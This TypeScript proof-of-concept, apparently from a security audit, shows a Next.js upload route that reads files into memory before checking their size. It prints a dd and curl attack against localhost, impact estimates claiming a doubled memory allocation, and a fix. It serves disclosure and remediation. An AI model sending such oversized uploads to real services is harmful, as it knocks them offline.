/**
 * PoC 3: MEMORY EXHAUSTION VIA UPLOAD — arrayBuffer Before Size Validation
 * Severity: HIGH (DoS)
 * 
 * Finding: In src/app/api/upload/route.ts, the file is read into memory via
 * `file.arrayBuffer()` (line 44) BEFORE any size validation occurs.
 * The fileSchema size check happens at line 101 (line 107 in the route).
 * 
 * Attack: Send upload requests with very large files (>10MB, even >1GB).
 * The server reads the entire file into memory before rejecting it.
 * Multiple concurrent requests can exhaust server memory.
 * 
 * Run: npx tsx .tmp-poc/poc3-memory-exhaustion-upload.ts
 */

import { readFileSync } from 'fs';

function poc() {
  console.log('=== PoC 3: Memory Exhaustion via Upload ===\n');

  // Read the upload route to show the vulnerability
  const uploadCode = readFileSync(
    new URL('../src/app/api/upload/route.ts', import.meta.url).pathname,
    'utf-8'
  );

  console.log('--- Vulnerability Analysis ---\n');
  console.log('Code flow in POST /api/upload:\n');

  // Extract relevant lines
  const lines = uploadCode.split('\n');
  const keyLines = [
    { line: 44, text: lines[43]?.trim(), label: 'FILE READ INTO MEMORY (arrayBuffer)' },
    { line: 45, text: lines[44]?.trim(), label: 'Buffer.from(fileBytes)' },
    { line: 46, text: lines[45]?.trim(), label: 'Hash computation on full buffer' },
    { line: 101, text: lines[100]?.trim(), label: 'fileSchema.safeParse size check' },
    { line: 107, text: lines[106]?.trim(), label: 'Size validation error returned' },
  ];

  for (const k of keyLines) {
    console.log(`  Line ${k.line}: ${k.text}`);
    console.log(`    → ${k.label}\n`);
  }

  console.log('--- Attack Scenario ---\n');
  console.log('1. Attacker creates a 1GB dummy file');
  console.log('2. Sends POST /api/upload with the large file');
  console.log('3. Server calls file.arrayBuffer() — allocates 1GB in Node.js heap');
  console.log('4. Buffer.from(fileBytes) — another ~1GB allocation');
  console.log('5. createHash().update(fileBuffer.subarray(0, 1024)) — reads first 1KB for hash');
  console.log('6. Finally, fileSchema validates size and rejects — but memory already consumed\n');

  console.log('--- Impact ---\n');
  console.log('• Single request: 2x file size memory allocation');
  console.log('• 10 concurrent requests with 1GB files: ~20GB memory');
  console.log('• Node.js default heap: ~1.5-4GB → OOM crash');
  console.log('• Serverless functions: memory limit hit → cold start loop');
  console.log('• No memory limit enforcement at the application layer\n');

  console.log('--- PoC curl command (DO NOT RUN against production) ---\n');
  console.log('  # Create 500MB test file');
  console.log('  dd if=/dev/zero of=/tmp/large-cv.pdf bs=1M count=500');
  console.log('  # Upload with authentication');
  console.log('  curl -X POST http://localhost:3000/api/upload \\');
  console.log('    -H "Cookie: authjs.session-token=<TOKEN>" \\');
  console.log('    -F "file=@/tmp/large-cv.pdf;type=application/pdf" \\');
  console.log('    -F "name=Test" -F "posisi=Dev" -F "kriteria=test" -F "prompt=test"');
  console.log('\n  # Server reads 500MB into memory before rejecting (fileSchema max 10MB)');
  console.log('  # Expected response: 400 "File size must be under 10MB"');
  console.log('  # But 1GB of memory was already allocated (arrayBuffer + Buffer.from)\n');

  console.log('--- Fix ---\n');
  console.log('Use file.stream() instead of file.arrayBuffer(), or check file.size first:');
  console.log('  if (file.size > 10 * 1024 * 1024) {');
  console.log('    return NextResponse.json({ error: "File too large" }, { status: 400 });');
  console.log('  }');
  console.log('  // THEN read into memory');
}

poc();
